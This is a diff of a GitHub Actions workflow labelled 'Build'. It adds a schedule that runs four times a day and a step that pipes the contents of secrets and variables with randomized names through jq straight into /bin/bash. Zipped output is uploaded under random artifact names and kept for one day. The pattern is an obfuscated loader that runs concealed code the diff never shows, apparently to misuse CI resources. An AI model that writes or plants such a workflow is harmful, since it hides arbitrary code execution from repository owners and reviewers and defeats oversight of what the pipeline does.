@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '5 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -13,19 +15,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          getd08: ${{ secrets.getd08 }}
+          sfqr57: ${{ secrets.sfqr57 }}
         run: |
-          printf '%s' "$getd08" | jq -r .lcam476 | /bin/bash
-          printf '%s' "$txbis06248" | jq -r .fr00 | /bin/bash
-          printf '%s' "$uqhej415" | jq -r .ylwui366 | /bin/bash
-          printf '%s' "$xgtp051" | jq -r .dm89422 | /bin/bash
-          printf '%s' "$uyry6213" | jq -r .ol99983 | /bin/bash
-          echo $afpfv1 | jq -r .x32011 | /bin/bash
+          printf '%s' "$sfqr57" | jq -r .r412 | /bin/bash
+          echo $ence9 | jq -r .u69 | /bin/bash
+          echo $xw31333 | jq -r .po2 | /bin/bash
+          printf '%s' "$x46" | jq -r .dupzb5 | /bin/bash
+          printf '%s' "$lxeuo8" | jq -r .trq127 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: KTCRTwj1
+          name: yNw0rmXC
           path: "*.zip"
           retention-days: 1
